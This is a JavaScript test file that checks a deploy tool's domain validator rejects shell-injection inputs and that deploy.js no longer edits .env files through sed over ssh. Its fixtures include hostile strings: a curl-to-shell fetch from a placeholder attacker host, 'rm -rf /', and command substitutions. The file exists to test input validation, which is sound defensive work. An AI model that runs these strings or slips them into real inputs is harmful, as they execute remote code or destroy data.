import { describe, expect, it } from 'vitest';
import { validateDomain } from '../../../src/lib/validators.js';

describe('C-5: --domain validation rejects shell-injection payloads', () => {
  it.each([
    ['evil"|curl attacker|sh'],
    ['evil.com;rm -rf /'],
    ["evil'com"],
    ['x$(whoami)'],
    ['x`id`'],
    ['evil.com && touch /tmp/owned'],
    ['spaces in domain'],
    ['.leadingdot'],
    ['trailingdot.'],
    [''],
  ])('rejects %s', (bad) => {
    expect(validateDomain(bad)).toBeTruthy();
  });

  it.each([['example.com'], ['app.example.co.uk'], ['sub.sub.sub.domain.io']])(
    'accepts %s',
    (good) => {
      expect(validateDomain(good)).toBeUndefined();
    },
  );
});

describe('C-5: deploy.js uses safe env merge, not remote sed', () => {
  it('deploy.js no longer calls sed -i for .env overrides', async () => {
    const { readFileSync } = await import('node:fs');
    const { join } = await import('node:path');
    const src = readFileSync(join(process.cwd(), 'src', 'deploy.js'), 'utf-8');
    // The legacy inject pattern used grep + sed + echo in a single ssh cmd.
    expect(src).not.toMatch(/grep -q.*sed -i.*\$\{key\}=.*\$\{value\}/);
  });
});
